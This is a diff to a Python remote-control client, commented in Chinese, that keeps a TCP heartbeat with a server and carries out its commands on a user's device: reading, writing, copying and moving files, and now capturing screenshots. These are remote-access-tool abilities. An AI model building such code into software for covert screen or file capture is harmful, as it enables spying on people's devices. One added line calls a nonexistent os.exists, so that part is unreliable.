@@ -1,3 +1,4 @@
+from PIL import ImageGrab
 import socket
 import os
 import json
@@ -88,6 +89,12 @@ def UUID(): # 用于操作储存UUID文件的函数 内部调用isUuidOK()
 			print('[INFO] UUID文件读取完成')
 			return content['uuid']
 
+def prepTemporaryStorageDir():
+	# 在所在目录下创建空文件夹 用于暂存各种文件
+	if os.exists(os.path.dirname(__file__) + r'\TemporaryStorage') == False:
+		os.mkdir(os.path.dirname(__file__) + r'\TemporaryStorage')
+		print('[WARNING] 文件暂存目录不存在 已新建')
+
 def remoteCtrl(): # 与服务器建立TCP链接 接收处理命令 发送返回值
 	global HBC # 调用全局变量HBC(HeartBeatController类)用于完全退出
 
@@ -113,6 +120,7 @@ def remoteCtrl(): # 与服务器建立TCP链接 接收处理命令 发送返回�
 
 
 HBC = HeartBeatController(UUID())
+prepTemporaryStorageDir()
 while True:
 	HBC.sendHb()
 	if HBC.recvHb() == True:
@@ -126,42 +134,42 @@ while True:
 
 
 # 用于储存对用户设备进行控制的功能的类
-# 错误反馈格式: ERROR_CODE 错误代码 需要发送至服务器的信息
-# 例如: ERROR_CODE 05 None       
-# ERROR_CODE用于使程序辨认为错误反馈 
-# 错误代码发送至服务器用于辨别错误类型 
-# 最后的信息为无法归类为错误类型时的附加内容 为None代表空
+# 反馈格式: 标签 内容 详细信息
+# 例如: ERROR 文件不存在 None
 class RemoteCtrlFunctions():
 	def __init__(self):
-		# wk_dir用于储存游走与目录时的当前目录 默认为用户设备桌面路径
+		# wk_dir用于储存游走于目录时的当前目录 默认为用户设备桌面路径
 		self.wk_path = os.path.join(os.path.expanduser("~"), 'Desktop\\')
-
+		self.temporary_storage_path = os.path.dirname(__file__) + r'\TemporaryStorage'
+	
+	'''
 	def createNewFile(self, new_file):
 		# 新建空文件 强制使用绝对路径 new_file为即将新建文件的绝对路径加文件名
 		ph, nm = os.path.split(new_file)
 		if os.path.exists(ph) == False:
-			# 路径不存在 错误代码01
-			return ['ERROR_CODE', '01', None]
+			# 路径不存在
+			return ['ERROR', '路径不存在', None]
 		elif os.path.exists(new_file) == True:
-			# 文件已存在 错误代码02
-			return ['ERROR_CODE', '02', None]
+			# 文件已存在
+			return ['ERROR', '已存在相同文件', None]
 		else:
 			try:
 				n_f = open(new_file, mode = 'w')
-				del n_f
-			except: # 发生无法捕捉确定的错误 错误代码03 附加反馈
-				return ['ERROR_CODE', '03', traceback.format_exc()]
+				n_f.close()
+			except: # 发生无法捕捉确定的错误 附加反馈
+				return ['ERROR', 'Unknow Error', traceback.format_exc()]
+	'''
 
 	def editFile(self, file, open_mode, operate_mode, ecding = 'utf-8', content = ''):
 		# 用于编辑文件 file为文件绝对路径加文件名 open_mode为打开文件的模式 
 		# operate_mode为操作模式('read'和'write') content为对文件进行写入操作的内容
 		# ecding为文件读取时的解码方式
 		if os.path.split(file)[1] == '':
-			# 无法对目录进行写入操作 错误代码04
-			return ['ERROR_CODE', '04', None]
+			# 无法对目录进行写入操作
+			return ['ERROR', '操作对象不能为目录', None]
 		elif os.path.exists(file) == False:
-			# 要写入的文件不存在 错误代码05
-			return ['ERROR_CODE', '05', None]
+			# 要写入的文件不存在
+			return ['ERROR', '操作对象不存在', None]
 		else:
 			try:
 				f = open(file, mode = open_mode, encoding = ecding)
@@ -172,20 +180,17 @@ class RemoteCtrlFunctions():
 					data = f.read()
 					f.close()
 					return ['INFO', data]
-				else:
-					# 无效的文件操作模式 错误代码06
-					return ['ERROR_CODE', '06', None]
 			except:
-				# 意料之外的错误 错误代码07 附加反馈
-				return ['ERROR_CODE', '07', traceback.format_exc()]
+				# 意料之外的错误 附加反馈
+				return ['ERROR', 'Unknow Error', traceback.format_exc()]
 
 	def moveOrCopyFileOrDir(self, src_file_or_path, dst_file_or_path, operate_mode):
 		# 若第二个参数为文件，复制source_file内容至此文件
 		# 若为文件夹，复制source_file的内容至文件夹内的同名文件
 		# 此方法强制使用绝对路径
 		if os.path.exists(src_file_or_path) == False:
-			# 源文件或目录不存在 错误代码08
-			return ['ERROR_CODE', '08', None]
+			# 源文件或目录不存在
+			return ['ERROR', '源文件或目录不存在', None]
 
 		if operate_mode == 'copy':
 			# 复制文件或目录
@@ -196,8 +201,8 @@ class RemoteCtrlFunctions():
 				elif os.path.isdir(src_file_or_path):
 					shutil.copytree(src_file_or_path, dst_file_or_path)
 			except Exception as e:
-				# 复制文件或目录时发生的错误 错误代码09
-				return ['ERROR_CODE', '09', str(e.__class__.__name__) + ' ' + str(e)]
+				# 复制文件或目录时发生的错误
+				return ['ERROR', str(e.__class__.__name__) + ' ' + str(e), None]
 
 		elif operate_mode == 'move':
 			# 剪切文件或目录
@@ -205,5 +210,13 @@ class RemoteCtrlFunctions():
 				# move函数不讲究源的类型
 				shutil.move(src_file_or_path, dst_file_or_path)
 			except Exception as e:
-				# 剪切文件或目录的错误 错误代码10
-				return ['ERROR_CODE', '10', str(e.__class__.__name__) + ' ' + str(e)]
+				# 剪切文件或目录的错误
+				return ['ERROR', str(e.__class__.__name__) + ' ' + str(e), None]
+
+	def getScreenshot(self, path):
+		# 截屏并保存至 绝对目录下
+		try:
+			im = ImageGrab.grab()
+			im.save(path + '.png')
+		except Exception as e:
+			return ['ERROR', str(e.__class__.__name__) + ' ' + str(e), None]
